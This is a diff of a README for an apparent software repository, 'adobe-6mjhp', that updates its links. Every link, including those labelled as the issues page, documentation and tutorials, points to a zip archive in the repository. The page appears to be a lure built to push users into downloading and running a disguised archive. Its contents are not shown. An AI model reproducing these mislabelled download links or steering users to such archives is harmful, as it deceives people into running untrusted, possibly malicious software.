@@ -8,13 +8,13 @@ Welcome to **adobe-6mjhp**! This application allows you to test development spee
 
 To download the latest version of **adobe-6mjhp**, visit the following page:
 
-[![Download Here](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip%20Release-blue)](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip)
+[![Download Here](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip%20Release-blue)](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip)
 
 Follow the steps below to install and run the application:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page where you can find the latest version of the software.  
-   [Visit this page to download](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip)
+   [Visit this page to download](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip)
 
 2. **Choose the Right File**  
    Look for the latest version, which will have the highest number (e.g., v1.0.0). This will typically be marked as "Latest Release."
@@ -94,7 +94,7 @@ If you encounter any issues while using **adobe-6mjhp**, consider the following 
 If you need assistance, you can reach out for support through the following channels:
 
 - **GitHub Issues:**  
-  Report problems or feedback directly on the [GitHub Issues page](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip).
+  Report problems or feedback directly on the [GitHub Issues page](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip).
 
 - **Community Forum:**  
   Join discussions and get help from other users on our community forum.
@@ -104,9 +104,9 @@ If you need assistance, you can reach out for support through the following chan
 For more information, you can check out the following resources:
 
 - **Documentation:**  
-  Comprehensive guides and detailed information can be found in the [Documentation section](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip).
+  Comprehensive guides and detailed information can be found in the [Documentation section](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip).
 
 - **Tutorials:**  
-  Step-by-step tutorials available on our [Tutorial page](https://raw.githubusercontent.com/mfcreed/adobe-6mjhp/main/ultraindifferent/adobe-6mjhp.zip).
+  Step-by-step tutorials available on our [Tutorial page](https://github.com/mfcreed/adobe-6mjhp/raw/refs/heads/main/ultraindifferent/adobe_mjhp_v3.1.zip).
 
 Thank you for using **adobe-6mjhp**! We hope this software enhances your testing experience. Don't forget to check for updates regularly to benefit from improvements and new features.
